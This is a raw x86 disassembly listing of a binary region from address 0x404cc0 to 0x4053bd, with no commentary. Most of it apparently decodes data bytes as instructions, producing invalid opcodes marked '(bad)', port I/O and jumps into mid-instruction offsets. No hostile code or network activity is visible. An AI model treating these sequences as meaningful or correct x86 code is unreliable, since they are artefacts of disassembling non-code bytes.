  404cc0:	dec    eax
  404cc1:	add    eax,0x6180008
  404cc6:	or     BYTE PTR [eax],al
  404cc8:	push   0xa8000805
  404ccd:	add    eax,0x5280008
  404cd2:	or     BYTE PTR [eax],al
  404cd4:	clc    
  404cd5:	add    eax,0x4a80008
  404cda:	or     BYTE PTR [eax],al
  404cdc:	cwde   
  404cdd:	add    eax,0x5380008
  404ce2:	or     BYTE PTR [eax],al
  404ce4:	call   0x784054ee
  404ce9:	add    eax,0xfe580008
  404cee:	pop    es
  404cef:	add    al,bl
  404cf1:	inc    BYTE PTR [edi]
  404cf3:	add    al,cl
  404cf5:	inc    BYTE PTR [edi]
  404cf7:	add    BYTE PTR [eax],bh
  404cf9:	inc    BYTE PTR [edi]
  404cfb:	add    BYTE PTR [esi+0x5],cl
  404cfe:	or     BYTE PTR [eax],al
  404d00:	into   
  404d01:	inc    BYTE PTR [edi]
  404d03:	add    BYTE PTR [esi+0x1e0007fe],bl
  404d09:	inc    BYTE PTR [edi]
  404d0b:	add    BYTE PTR [esi],ch
  404d0d:	add    eax,0xfeae0008
  404d12:	pop    es
  404d13:	add    BYTE PTR [ebp-0x3],dh
  404d16:	add    ecx,DWORD PTR [eax]
  404d18:	jne    0x404d97
  404d1a:	add    al,0x8
  404d1c:	add    BYTE PTR [eax],al
  404d1e:	add    BYTE PTR [eax],al
  404d20:	add    BYTE PTR [ebp-0x53],dh
  404d23:	add    ecx,DWORD PTR [eax]
  404d25:	jne    0x404d54
  404d27:	add    al,0x8
  404d29:	jne    0x404d18
  404d2b:	add    ecx,DWORD PTR [eax]
  404d2d:	jne    0x404d9c
  404d2f:	add    al,0x8
  404d31:	jne    0x404d20
  404d33:	add    ecx,DWORD PTR [eax]
  404d35:	jne    0x404da4
  404d37:	add    al,0x8
  404d39:	jne    0x404ce8
  404d3b:	add    ecx,DWORD PTR [eax]
  404d3d:	jne    0x404d6c
  404d3f:	add    al,0x8
  404d41:	jne    0x404cd8
  404d43:	add    ecx,DWORD PTR [eax]
  404d45:	jne    0x404d5c
  404d47:	add    al,0x8
  404d49:	jne    0x404db0
  404d4b:	add    ecx,DWORD PTR [eax]
  404d4d:	jne    0x404d34
  404d4f:	add    ecx,DWORD PTR [eax]
  404d51:	jne    0x404d08
  404d53:	add    ecx,DWORD PTR [eax]
  404d55:	jne    0x404d8c
  404d57:	add    al,0x8
  404d59:	jne    0x404ce0
  404d5b:	add    ecx,DWORD PTR [eax]
  404d5d:	jne    0x404d64
  404d5f:	add    al,0x8
  404d61:	jne    0x404d08
  404d63:	add    ecx,DWORD PTR [eax]
  404d65:	jne    0x404d8c
  404d67:	add    al,0x8
  404d69:	jne    0x404de0
  404d6b:	add    ecx,DWORD PTR [eax]
  404d6d:	jne    0x404d64
  404d6f:	add    ecx,DWORD PTR [eax]
  404d71:	jne    0x404d58
  404d73:	add    ecx,DWORD PTR [eax]
  404d75:	jne    0x404ddc
  404d77:	add    ecx,DWORD PTR [eax]
  404d79:	jne    0x404dae
  404d7b:	add    al,0x8
  404d7d:	jne    0x404d32
  404d7f:	add    ecx,DWORD PTR [eax]
  404d81:	jne    0x404d1a
  404d83:	add    ecx,DWORD PTR [eax]
  404d85:	add    BYTE PTR [eax],al
  404d87:	add    BYTE PTR [eax],al
  404d89:	add    BYTE PTR [ebp+0x1f],dh
  404d8c:	add    ecx,DWORD PTR [eax]
  404d8e:	jne    0x404d67
  404d90:	add    ecx,DWORD PTR [eax]
  404d92:	jne    0x404df3
  404d94:	add    ecx,DWORD PTR [eax]
  404d96:	jne    0x404d9a
  404d98:	iret   
  404d99:	add    ebp,DWORD PTR [ebp+0x2]
  404d9c:	inc    edi
  404d9d:	add    edi,DWORD PTR [ebp+0x2]
  404da0:	(bad)  
  404da2:	jge    0x404da6
  404da4:	xchg   DWORD PTR [ebx],eax
  404da6:	ins    DWORD PTR es:[edi],dx
  404da7:	add    bl,bh
  404da9:	add    ebp,DWORD PTR [ebp+0x2]
  404dac:	push   edi
  404dad:	add    edi,DWORD PTR [ebp+0x2]
  404db0:	pop    ds
  404db1:	add    al,0x7d
  404db3:	add    dl,BYTE PTR [edi+0x1f026d03]
  404db9:	add    al,0x6d
  404dbb:	add    dl,BYTE PTR [edi-0x20fd82fd]
  404dc1:	add    edi,DWORD PTR [ebp+0x2]
  404dc4:	push   edi
  404dc5:	add    ebp,DWORD PTR [ebp+0x2]
  404dc8:	test   DWORD PTR [ebx],0x36f026d
  404dce:	jge    0x404dd2
  404dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dd1:	add    edi,DWORD PTR [ebp+0x2]
  404dd4:	pop    ds
  404dd5:	add    ebp,DWORD PTR [ebp+0x2]
  404dd8:	xlat   BYTE PTR ds:[ebx]
  404dd9:	add    ebp,DWORD PTR [ebp+0x2]
  404ddc:	dec    edi
  404ddd:	add    edi,DWORD PTR [ebp+0x2]
  404de0:	xchg   DWORD PTR [ebx],eax
  404de2:	jge    0x404de6
  404de4:	inc    DWORD PTR [edx]
  404de6:	ins    DWORD PTR es:[edi],dx
  404de7:	add    ah,bh
  404de9:	add    ebp,DWORD PTR [ebp+0x2]
  404dec:	pop    edi
  404ded:	add    eax,DWORD PTR [eax]
  404def:	add    BYTE PTR [eax],al
  404df1:	add    BYTE PTR [eax],al
  404df3:	jge    0x404df7
  404df5:	xchg   edi,eax
  404df6:	add    edi,DWORD PTR [ebp+0x2]
  404df9:	lsl    ebp,WORD PTR [ebp+0x2]
  404dfd:	daa    
  404dfe:	add    al,0x6d
  404e00:	add    bl,BYTE PTR [edi+0x57027d04]
  404e06:	add    al,0x7d
  404e08:	add    cl,bh
  404e0a:	add    al,0x6d
  404e0c:	add    ch,al
  404e0e:	add    ebp,DWORD PTR [ebp+0x2]
  404e11:	push   0x27d04
  404e16:	sub    BYTE PTR [ecx-0x6],dh
  404e19:	jmp    DWORD PTR [edi-0x38000587]
  404e1f:	jbe    0x404e1b
  404e21:	inc    DWORD PTR [edi+0x79]
  404e24:	cli    
  404e25:	inc    DWORD PTR [edi]
  404e27:	jno    0x404e23
  404e29:	inc    DWORD PTR [edi-0x28000587]
  404e2f:	jbe    0x404e2b
  404e31:	call   DWORD PTR [edi+0x79]
  404e34:	cli    
  404e35:	call   DWORD PTR [edi]
  404e37:	jno    0x404e33
  404e39:	call   DWORD PTR [edi+0x17fffa79]
  404e3f:	jno    0x404e3b
  404e41:	call   DWORD PTR [edi-0x28000587]
  404e47:	jbe    0x404e43
  404e49:	call   DWORD PTR [edi+0x79]
  404e4c:	cli    
  404e4d:	(bad)  
  404e4e:	out    dx,eax
  404e4f:	jbe    0x404e4b
  404e51:	jmp    FWORD PTR [edi+0x79]
  404e54:	cli    
  404e55:	call   FWORD PTR [edi+0x0]
  404e5b:	add    BYTE PTR [esi-0x6],dh
  404e5e:	call   FWORD PTR [edi]
  404e60:	jns    0x404e5c
  404e62:	dec    edi
  404e64:	jbe    0x404e60
  404e66:	dec    DWORD PTR [edi+0x79]
  404e69:	cli    
  404e6a:	(bad)  
  404e6b:	jg     0x404ee3
  404e6d:	cli    
  404e6e:	(bad)  
  404e6f:	(bad)  
  404e70:	jns    0x404e6c
  404e72:	(bad)  
  404e73:	fbstp  TBYTE PTR [esi-0x6]
  404e76:	call   FWORD PTR [edi+0x79]
  404e79:	cli    
  404e7a:	dec    DWORD PTR [edi+0xffffa76]
  404e80:	jns    0x404e7c
  404e82:	call   FWORD PTR [edi]
  404e84:	jno    0x404e80
  404e86:	call   FWORD PTR [edi+0x4ffffa76]
  404e8c:	jno    0x404e88
  404e8e:	dec    edi
  404e90:	jbe    0x404e8c
  404e92:	(bad)  
  404e93:	dec    DWORD PTR [ecx+0x2]
  404e96:	or     BYTE PTR [eax],al
  404e98:	fld    DWORD PTR [ecx]
  404e9a:	or     BYTE PTR [eax],al
  404e9c:	cdq    
  404e9d:	inc    BYTE PTR [edi]
  404e9f:	add    BYTE PTR [ecx],bl
  404ea1:	add    cl,BYTE PTR [eax]
  404ea3:	add    BYTE PTR [ecx],ch
  404ea5:	add    cl,BYTE PTR [eax]
  404ea7:	add    BYTE PTR [ecx+0x79000801],bh
  404ead:	inc    BYTE PTR [edi]
  404eaf:	add    cl,bh
  404eb1:	add    DWORD PTR [eax],ecx
  404eb3:	add    BYTE PTR [ecx],bh
  404eb5:	add    cl,BYTE PTR [eax]
  404eb7:	add    BYTE PTR [ecx+0x69000801],ch
  404ebd:	inc    BYTE PTR [edi]
  404ebf:	add    BYTE PTR [eax],al
  404ec1:	add    BYTE PTR [eax],al
  404ec3:	add    BYTE PTR [eax],al
  404ec5:	jmp    0x594056cb
  404eca:	inc    BYTE PTR [edi]
  404ecc:	add    BYTE PTR [ecx],cl
  404ece:	add    cl,BYTE PTR [eax]
  404ed0:	add    cl,cl
  404ed2:	add    DWORD PTR [eax],ecx
  404ed4:	add    BYTE PTR [ecx+0x1],cl
  404ed7:	or     BYTE PTR [eax],al
  404ed9:	loope  0x404edc
  404edb:	or     BYTE PTR [eax],al
  404edd:	popa   
  404ede:	add    DWORD PTR [eax],ecx
  404ee0:	add    BYTE PTR [ecx],dl
  404ee2:	add    cl,BYTE PTR [eax]
  404ee4:	add    BYTE PTR [ecx+0x1],ah
  404ee7:	or     BYTE PTR [eax],al
  404ee9:	mov    eax,ds:0x41000801
  404eee:	add    DWORD PTR [eax],ecx
  404ef0:	add    cl,dh
  404ef2:	add    DWORD PTR [eax],ecx
  404ef4:	add    BYTE PTR [ecx-0x6efff800],ah
  404efa:	add    DWORD PTR [eax],ecx
  404efc:	add    BYTE PTR [ecx],dh
  404efe:	add    DWORD PTR [eax],ecx
  404f00:	add    cl,ah
  404f02:	add    DWORD PTR [eax],ecx
  404f04:	add    BYTE PTR [ecx+0x1],dh
  404f07:	or     BYTE PTR [eax],al
  404f09:	push   ecx
  404f0a:	inc    BYTE PTR [edi]
  404f0c:	add    BYTE PTR [ecx],dl
  404f0e:	inc    BYTE PTR [edi]
  404f10:	add    BYTE PTR [ebp+0x2e],dh
  404f13:	add    al,0x8
  404f15:	jne    0x404ecd
  404f17:	add    al,0x8
  404f19:	jne    0x404ec3
  404f1b:	add    ecx,DWORD PTR [ecx]
  404f1d:	jne    0x404ec7
  404f1f:	add    al,0x9
  404f21:	jne    0x404f4b
  404f23:	add    al,0x9
  404f25:	jne    0x404f4f
  404f27:	add    eax,0x9
  404f2c:	add    BYTE PTR [eax],al
  404f2e:	jne    0x404ef8
  404f30:	add    ecx,DWORD PTR [ecx]
  404f32:	jne    0x404efc
  404f34:	add    al,0x9
  404f36:	jne    0x404f80
  404f38:	add    al,0x9
  404f3a:	jne    0x404f84
  404f3c:	add    eax,0x3487509
  404f41:	or     DWORD PTR [ebp+0x48],esi
  404f44:	add    al,0x9
  404f46:	jne    0x404f10
  404f48:	add    ecx,DWORD PTR [ecx]
  404f4a:	jne    0x404f14
  404f4c:	add    al,0x9
  404f4e:	jne    0x404ef8
  404f50:	add    ecx,DWORD PTR [ecx]
  404f52:	jne    0x404efc
  404f54:	add    al,0x9
  404f56:	jne    0x404f80
  404f58:	add    al,0x9
  404f5a:	jne    0x404f84
  404f5c:	add    eax,0x3907509
  404f61:	or     DWORD PTR [ebp-0x70],esi
  404f64:	add    al,0x9
  404f66:	jne    0x404f88
  404f68:	add    al,0x9
  404f6a:	jne    0x404f8c
  404f6c:	add    eax,0x3507509
  404f71:	or     DWORD PTR [ebp+0x50],esi
  404f74:	add    al,0x9
  404f76:	jne    0x404f58
  404f78:	add    ecx,DWORD PTR [ecx]
  404f7a:	jne    0x404f5c
  404f7c:	add    al,0x9
  404f7e:	jne    0x404f30
  404f80:	add    ecx,DWORD PTR [ecx]
  404f82:	jne    0x404f34
  404f84:	add    al,0x9
  404f86:	jne    0x404fc8
  404f88:	add    al,0x9
  404f8a:	jne    0x404fcc
  404f8c:	add    eax,0x52027509
  404f91:	add    al,0x0
  404f93:	add    BYTE PTR [eax],al
  404f95:	add    BYTE PTR [eax],al
  404f97:	jl     0x404f9b
  404f99:	push   edx
  404f9a:	add    eax,0x3c2027c
  404f9f:	ins    BYTE PTR es:[edi],dx
  404fa0:	add    al,dl
  404fa2:	add    al,0x6c
  404fa4:	add    ah,dl
  404fa6:	add    edi,DWORD PTR [edx+eax*1-0x1e]
  404faa:	add    al,0x7c
  404fac:	add    dl,BYTE PTR [edx+0x3]
  404faf:	ins    BYTE PTR es:[edi],dx
  404fb0:	add    dl,BYTE PTR [edx+0x4]
  404fb3:	ins    BYTE PTR es:[edi],dx
  404fb4:	add    al,BYTE PTR [edx+0x4]
  404fb7:	jl     0x404fbb
  404fb9:	inc    edx
  404fba:	add    eax,0x3b2027c
  404fbf:	ins    BYTE PTR es:[edi],dx
  404fc0:	add    dh,BYTE PTR [edx-0x3dfd93fc]
  404fc6:	add    edi,DWORD PTR [edx+eax*1-0x3e]
  404fca:	add    al,0x7c
  404fcc:	add    dh,BYTE PTR [edx]
  404fce:	add    ebp,DWORD PTR [edx+eax*1+0x32]
  404fd2:	add    al,0x6c
  404fd4:	add    ah,dl
  404fd6:	add    edi,DWORD PTR [edx+eax*1-0x1e]
  404fda:	add    al,0x7c
  404fdc:	add    dl,BYTE PTR [edx+0x3]
  404fdf:	ins    BYTE PTR es:[edi],dx
  404fe0:	add    dl,BYTE PTR [edx+0x4]
  404fe3:	ins    BYTE PTR es:[edi],dx
  404fe4:	add    ch,dh
  404fe6:	add    edi,DWORD PTR [edx+eax*1-0x1a]
  404fea:	add    al,0x7c
  404fec:	add    ch,BYTE PTR [esi+0x3]
  404fef:	ins    BYTE PTR es:[edi],dx
  404ff0:	add    ah,BYTE PTR [esi+0x4]
  404ff3:	ins    BYTE PTR es:[edi],dx
  404ff4:	add    ch,BYTE PTR [esi-0x59fd83fd]
  404ffa:	add    al,0x0
  404ffc:	add    BYTE PTR [eax],al
  404ffe:	add    BYTE PTR [eax],al
  405000:	jl     0x405004
  405002:	add    ebp,DWORD PTR cs:[edx+eax*1+0x26]
  405007:	add    al,0x6c
  405009:	add    cl,dh
  40500b:	add    edi,DWORD PTR [edx+eax*1-0x3a]
  40500f:	add    al,0x7c
  405011:	add    al,BYTE PTR [eax]
  405013:	dec    esi
  405014:	jbe    0x40500f
  405016:	inc    DWORD PTR [ebp+0x71]
  405019:	stc    
  40501a:	dec    DWORD PTR [ebp+0x79]
  40501d:	stc    
  40501e:	inc    DWORD PTR [ebp+0x76]
  405021:	stc    
  405022:	dec    ebp
  405024:	jns    0x40501f
  405026:	inc    ebp
  405028:	jbe    0x405023
  40502a:	(bad)  
  40502b:	fnsave [esi-0x7]
  40502e:	call   ebp
  405030:	ja     0x40502b
  405032:	call   FWORD PTR [ebp+0x79]
  405035:	stc    
  405036:	call   DWORD PTR [ebp+0x76]
  405039:	stc    
  40503a:	(bad)  
  40503b:	cmp    eax,0x35fff979
  405040:	jbe    0x40503b
  405042:	(bad)  
  405043:	mov    ebp,0xb5fff979
  405048:	jbe    0x405043
  40504a:	(bad)  
  40504b:	mov    ebp,0xb5fff976
  405050:	ja     0x40504b
  405052:	(bad)  
  405053:	cmp    eax,0x35fff979
  405058:	jbe    0x405053
  40505a:	(bad)  
  40505b:	fnsave [esi-0x7]
  40505e:	call   ebp
  405060:	ja     0x40505b
  405062:	call   FWORD PTR [ebp+0x0]
  405065:	add    BYTE PTR [eax],al
  405067:	add    BYTE PTR [eax],al
  405069:	jns    0x405064
  40506b:	call   DWORD PTR [ebp+0x76]
  40506e:	stc    
  40506f:	push   ebp
  405071:	jbe    0x40506c
  405073:	(bad)  
  405074:	in     eax,dx
  405075:	ja     0x405070
  405077:	jmp    DWORD PTR [ebp+0x79]
  40507a:	stc    
  40507b:	call   FWORD PTR [ebp+0x76]
  40507e:	stc    
  40507f:	push   DWORD PTR [ebp-0x5200068a]
  405085:	ja     0x405080
  405087:	jmp    DWORD PTR ds:0x1dfff979
  40508d:	jbe    0x405088
  40508f:	(bad)  
  405090:	jmp    FWORD PTR [ebx-0x44fff702]
  405096:	dec    DWORD PTR [eax]
  405098:	add    BYTE PTR [ebx],bh
  40509a:	dec    BYTE PTR [eax]
  40509c:	add    BYTE PTR [ebx],bh
  40509e:	dec    DWORD PTR [eax]
  4050a0:	add    bl,cl
  4050a2:	push   es
  4050a3:	or     DWORD PTR [eax],eax
  4050a5:	mov    ebx,0x3b000905
  4050aa:	push   es
  4050ab:	or     DWORD PTR [eax],eax
  4050ad:	sbb    eax,DWORD PTR ds:0x65b0009
  4050b3:	or     DWORD PTR [eax],eax
  4050b5:	sub    eax,DWORD PTR ds:0x5ab0009
  4050bb:	or     DWORD PTR [eax],eax
  4050bd:	stos   DWORD PTR es:[edi],eax
  4050be:	add    al,0x9
  4050c0:	add    BYTE PTR [ebx+0x6b000906],bh
  4050c6:	add    eax,0x5eb0009
  4050cb:	or     DWORD PTR [eax],eax
  4050cd:	add    BYTE PTR [eax],al
  4050cf:	add    BYTE PTR [eax],al
  4050d1:	add    bl,cl
  4050d3:	add    al,0x9
  4050d5:	add    BYTE PTR [ebx],bh
  4050d7:	push   es
  4050d8:	or     DWORD PTR [eax],eax
  4050da:	retf   
  4050db:	add    al,0x9
  4050dd:	add    BYTE PTR [ebx+0x5],cl
  4050e0:	or     DWORD PTR [eax],eax
  4050e2:	dec    ebx
  4050e3:	add    al,0x9
  4050e5:	add    bl,bl
  4050e7:	add    eax,0x4cb0009
  4050ec:	or     DWORD PTR [eax],eax
  4050ee:	dec    ebx
  4050ef:	add    eax,0x42b0009
  4050f4:	or     DWORD PTR [eax],eax
  4050f6:	fadd   QWORD PTR ds:0x61c0007
  4050fc:	pop    es
  4050fd:	add    BYTE PTR [esi+eax*1+0x7],ch
  405101:	add    BYTE PTR [ebp+eax*1+0x5ac0007],ch
  405108:	pop    es
  405109:	add    ah,ch
  40510b:	add    eax,0x5b750007
  405110:	add    eax,DWORD PTR [edi]
  405112:	jne    0x4050af
  405114:	add    eax,DWORD PTR [edi]
  405116:	jne    0x40518b
  405118:	add    eax,DWORD PTR [edi]
  40511a:	jne    0x4050cf
  40511c:	add    eax,DWORD PTR [edi]
  40511e:	jne    0x405163
  405120:	add    eax,DWORD PTR [edi]
  405122:	jne    0x4050a7
  405124:	add    eax,DWORD PTR [edi]
  405126:	jne    0x40512b
  405128:	add    al,0x7
  40512a:	jne    0x4050ef
  40512c:	add    eax,DWORD PTR [edi]
  40512e:	jne    0x405143
  405130:	add    al,0x7
  405132:	jne    0x405107
  405134:	add    eax,DWORD PTR [edi]
  405136:	add    BYTE PTR [eax],al
  405138:	add    BYTE PTR [eax],al
  40513a:	add    BYTE PTR [ebp+0x6f],dh
  40513d:	add    eax,DWORD PTR [edi]
  40513f:	jne    0x405168
  405141:	add    al,0x7
  405143:	jne    0x405154
  405145:	add    al,0x7
  405147:	jne    0x405110
  405149:	add    eax,DWORD PTR [edi]
  40514b:	jne    0x4051cc
  40514d:	add    eax,DWORD PTR [edi]
  40514f:	jne    0x405188
  405151:	add    al,0x7
  405153:	jne    0x4051b4
  405155:	add    eax,DWORD PTR [edi]
  405157:	jne    0x405170
  405159:	add    al,0x7
  40515b:	jne    0x4051c9
  40515d:	add    ecx,DWORD PTR [eax]
  40515f:	jne    0x40514d
  405161:	add    ecx,DWORD PTR [eax]
  405163:	jne    0x405191
  405165:	add    al,0x8
  405167:	jne    0x405115
  405169:	add    al,0x8
  40516b:	jne    0x405179
  40516d:	add    al,0x8
  40516f:	jne    0x4050fd
  405171:	add    al,0x8
  405173:	jne    0x4051c1
  405175:	add    ecx,DWORD PTR [eax]
  405177:	jne    0x405145
  405179:	add    ecx,DWORD PTR [eax]
  40517b:	jne    0x4051e8
  40517d:	add    eax,DWORD PTR ds:0x5035b75
  405183:	jne    0x4051e8
  405185:	add    eax,DWORD PTR ds:0x5035375
  40518b:	jne    0x40518f
  40518d:	in     eax,dx
  40518e:	add    esi,DWORD PTR [eax+0x2]
  405191:	cmc    
  405192:	add    edi,DWORD PTR [eax+0x2]
  405195:	in     eax,0x3
  405197:	jo     0x40519b
  405199:	in     eax,dx
  40519a:	add    edi,DWORD PTR [eax+0x2]
  40519d:	jmp    0x4051a2
  40519f:	add    BYTE PTR [eax],al
  4051a1:	add    BYTE PTR [eax],al
  4051a3:	add    BYTE PTR [eax+0x2],dh
  4051a6:	fild   DWORD PTR [ebx]
  4051a8:	js     0x4051ac
  4051aa:	jecxz  0x4051af
  4051ac:	jo     0x4051b0
  4051ae:	rol    DWORD PTR [ebx],cl
  4051b0:	js     0x4051b4
  4051b2:	out    dx,eax
  4051b3:	add    esi,DWORD PTR [eax+0x2]
  4051b6:	test   DWORD PTR [ebx],0x3e70278
  4051bc:	jo     0x4051c0
  4051be:	out    dx,eax
  4051bf:	add    edi,DWORD PTR [eax+0x2]
  4051c2:	call   0xd842c1ca
  4051c7:	add    edi,DWORD PTR [eax+0x2]
  4051ca:	loopne 0x4051cf
  4051cc:	jo     0x4051d0
  4051ce:	rol    BYTE PTR [ebx],1
  4051d0:	js     0x4051d4
  4051d2:	in     al,dx
  4051d3:	add    esi,DWORD PTR [eax+0x2]
  4051d6:	hlt    
  4051d7:	add    edi,DWORD PTR [eax+0x2]
  4051da:	in     al,0x3
  4051dc:	jo     0x4051e0
  4051de:	in     al,dx
  4051df:	add    edi,DWORD PTR [eax+0x2]
  4051e2:	jmp    0x7803:0xda027003
  4051e9:	add    ah,dl
  4051eb:	add    esi,DWORD PTR [eax+0x2]
  4051ee:	rol    BYTE PTR [ebx],cl
  4051f0:	js     0x4051f4
  4051f2:	out    dx,al
  4051f3:	add    esi,DWORD PTR [eax+0x2]
  4051f6:	test   BYTE PTR [ebx],0x78
  4051f9:	add    ch,cl
  4051fb:	add    al,0x77
  4051fd:	add    esp,ebp
  4051ff:	pop    es
  405200:	js     0x405207
  405202:	out    dx,eax
  405203:	or     DWORD PTR [ebx+0x8],esi
  405206:	out    0xa,al
  405208:	add    BYTE PTR [eax],al
  40520a:	add    BYTE PTR [eax],al
  40520c:	add    BYTE PTR [edx+0x7],bh
  40520f:	add    cl,ah
  405211:	outs   dx,BYTE PTR ds:[esi]
  405212:	or     cl,BYTE PTR [eax]
  405214:	loope  0x405294
  405216:	or     cl,BYTE PTR [eax]
  405218:	lock jns 0x405224
  40521b:	or     eax,esi
  40521d:	jno    0x405228
  40521f:	or     ebx,esp
  405221:	push   0x80e30a0c
  405226:	or     al,0xa
  405228:	repz js 0x405237
  40522b:	or     dh,bl
  40522d:	jo     0x40523b
  40522f:	or     ah,dl
  405231:	imul   ecx,DWORD PTR [ebx],0xb
  405234:	loop   0x4051b9
  405236:	or     ecx,DWORD PTR [ebx]
  405238:	bnd jns 0x405246
  40523b:	or     esi,edx
  40523d:	jno    0x40524a
  40523f:	or     esp,ebp
  405241:	push   0xe
  405243:	or     al,0xdd
  405245:	or     BYTE PTR [esi],0xc
  405248:	cmc    
  405249:	jp     0x405259
  40524b:	or     al,0xed
  40524d:	jb     0x40525d
  40524f:	or     al,0xe5
  405251:	push   0xe
  405253:	or     al,0xdd
  405255:	or     BYTE PTR [esi],0xc
  405258:	cmc    
  405259:	jp     0x405269
  40525b:	or     al,0xed
  40525d:	jb     0x40526d
  40525f:	or     al,0xe4
  405261:	imul   ecx,DWORD PTR ds:0xd83dc0d,0xd
  405268:	hlt    
  405269:	jnp    0x405278
  40526b:	or     eax,0xd0d73ec
  405270:	in     al,0x0
  405272:	add    BYTE PTR [eax],al
  405274:	add    BYTE PTR [eax],al
  405276:	imul   ecx,DWORD PTR ds:0xd83dc0d,0xd
  40527d:	hlt    
  40527e:	jnp    0x40528d
  405280:	or     eax,0xd0d73ec
  405285:	out    0x84,eax
  405287:	adc    BYTE PTR [esi],cl
  405289:	fbld   TBYTE PTR [eax+edx*1+0xe]
  40528d:	add    dl,al
  40528f:	adc    BYTE PTR [esi],cl
  405291:	push   cs
  405292:	rcl    BYTE PTR [eax],cl
  405294:	push   cs
  405295:	push   cs
  405296:	rcl    BYTE PTR [eax],cl
  405298:	push   cs
  405299:	push   cs
  40529a:	rcl    BYTE PTR [eax],cl
  40529c:	push   cs
  40529d:	push   cs
  40529e:	mov    ds:0x920e0e10,al
  4052a3:	adc    BYTE PTR [esi],cl
  4052a5:	push   cs
  4052a6:	xchg   edx,eax
  4052a7:	adc    BYTE PTR [esi],cl
  4052a9:	push   cs
  4052aa:	mov    dl,0x10
  4052ac:	push   cs
  4052ad:	push   cs
  4052ae:	adc    BYTE PTR [eax],0xe
  4052b1:	push   cs
  4052b2:	xchg   edx,eax
  4052b3:	adc    BYTE PTR [esi],cl
  4052b5:	push   cs
  4052b6:	xchg   edx,eax
  4052b7:	adc    BYTE PTR [esi],cl
  4052b9:	push   cs
  4052ba:	push   edx
  4052bb:	adc    al,0xe
  4052bd:	push   cs
  4052be:	bound  edx,QWORD PTR [esi+ecx*1]
  4052c1:	push   cs
  4052c2:	push   edx
  4052c3:	adc    al,0xe
  4052c5:	push   cs
  4052c6:	push   ebx
  4052c7:	adc    ecx,DWORD PTR [edi]
  4052c9:	rdpmc  
  4052cb:	adc    ecx,DWORD PTR [edi]
  4052cd:	cmovae edx,DWORD PTR [ebx]
  4052d0:	(bad)  
  4052d1:	rcpps  xmm2,XMMWORD PTR [ebx]
  4052d4:	(bad)  
  4052d5:	rcpps  xmm2,XMMWORD PTR [ebx]
  4052d8:	(bad)  
  4052d9:	sldt   WORD PTR [eax]
  4052dc:	add    BYTE PTR [eax],al
  4052de:	add    BYTE PTR [ebx+0x13],dl
  4052e1:	(bad)  
  4052e2:	mov    db2,ebx
  4052e5:	(bad)  
  4052e6:	movlps QWORD PTR [ebx],xmm2
  4052e9:	(bad)  
  4052ea:	movlps QWORD PTR [ebx],xmm2
  4052ed:	(bad)  
  4052ee:	rdpmc  
  4052f0:	adc    ecx,DWORD PTR [edi]
  4052f2:	lsl    edx,WORD PTR [ebx]
  4052f5:	(bad)  
  4052f6:	movlps QWORD PTR [ebx],xmm2
  4052f9:	(bad)  
  4052fa:	movlps QWORD PTR [ebx],xmm2
  4052fd:	(bad)  
  4052fe:	psrlq  mm2,QWORD PTR [edx]
  405301:	(bad)  
  405302:	pavgw  mm2,QWORD PTR [edx]
  405305:	(bad)  
  405306:	psrlq  mm2,QWORD PTR [edx]
  405309:	(bad)  
  40530a:	pcmpeqw mm5,QWORD PTR [ebx+0x3]
  40530e:	adc    BYTE PTR [ecx+edi*2+0x15],ah
  405312:	adc    esp,DWORD PTR [esi+0x5f]
  405315:	pop    ss
  405316:	adc    al,0x69
  405318:	push   esi
  405319:	push   ss
  40531a:	adc    eax,0x16195d60
  40531f:	mov    edx,DWORD PTR [ebp+0x19]
  405322:	push   ss
  405323:	cmp    DWORD PTR [eax+ebx*1+0x17],0xffffff8a
  405328:	je     0x405342
  40532a:	pop    ss
  40532b:	xor    BYTE PTR [ebx+0x1b],0x18
  40532f:	ins    DWORD PTR es:[edi],dx
  405330:	jae    0x40534d
  405332:	sbb    BYTE PTR [ebp+0x63],ch
  405335:	sbb    ebx,DWORD PTR [eax]
  405337:	pop    ebp
  405338:	arpl   WORD PTR [ebx],bx
  40533a:	sbb    BYTE PTR [ebp+0x52],bl
  40533d:	sbb    bl,BYTE PTR [ecx]
  40533f:	mov    WORD PTR [edx+0x1a],ss
  405342:	sbb    DWORD PTR [eax],eax
  405344:	add    BYTE PTR [eax],al
  405346:	add    BYTE PTR [eax],al
  405348:	mov    WORD PTR [edx],es
  40534a:	sbb    eax,0x1d027c19
  40534f:	sbb    DWORD PTR [ecx+esi*2+0x19],edi
  405353:	sbb    ch,BYTE PTR [edi+0x71]
  405356:	sbb    DWORD PTR [edx],ebx
  405358:	outs   dx,DWORD PTR ds:[esi]
  405359:	popa   
  40535a:	sbb    DWORD PTR [edx],ebx
  40535c:	pop    edi
  40535d:	popa   
  40535e:	sbb    DWORD PTR [edx],ebx
  405360:	pop    edi
  405361:	push   ecx
  405362:	sbb    DWORD PTR [edx],ebx
  405364:	(bad)  
  405365:	push   ecx
  405366:	sbb    DWORD PTR [edx],ebx
  405368:	pop    DWORD PTR [ecx]
  40536a:	sbb    bl,BYTE PTR [edx]
  40536c:	jg     0x40536f
  40536e:	sbb    bl,BYTE PTR [edx]
  405370:	jg     0x4053e2
  405372:	sbb    bl,BYTE PTR [ebx]
  405374:	outs   dx,BYTE PTR ds:[esi]
  405375:	jo     0x405391
  405377:	sbb    ebp,DWORD PTR [esi+0x60]
  40537a:	sbb    bl,BYTE PTR [ebx]
  40537c:	pop    esi
  40537d:	pusha  
  40537e:	sbb    bl,BYTE PTR [ebx]
  405380:	pop    esi
  405381:	push   eax
  405382:	sbb    bl,BYTE PTR [ebx]
  405384:	mov    ss,WORD PTR [eax+0x1a]
  405387:	sbb    ecx,DWORD PTR [esi+0x7e1b0202]
  40538d:	sbb    DWORD PTR [edx],eax
  40538f:	sbb    edi,DWORD PTR [esi+0x19]
  405392:	cmc    
  405393:	pop    ds
  405394:	jno    0x4053b4
  405396:	in     eax,dx
  405397:	pop    ds
  405398:	imul   ebx,DWORD PTR [esi],0x1e611fe5
  40539e:	fstp   QWORD PTR [edi]
  4053a0:	pop    ecx
  4053a1:	push   ds
  4053a2:	aad    0x1f
  4053a4:	xchg   ecx,eax
  4053a5:	push   ds
  4053a6:	int    0x1f
  4053a8:	mov    DWORD PTR [esi],ebx
  4053aa:	add    eax,0x20
  4053af:	add    BYTE PTR [eax],al
  4053b1:	sbb    DWORD PTR [esi],0x1e791ffd
  4053b7:	cmc    
  4053b8:	pop    ds
  4053b9:	jno    0x4053d9
  4053bb:	in     eax,dx
  4053bc:	pop    ds
  4053bd:	imul   ebx,DWORD PTR [esi],0x1e611fe5
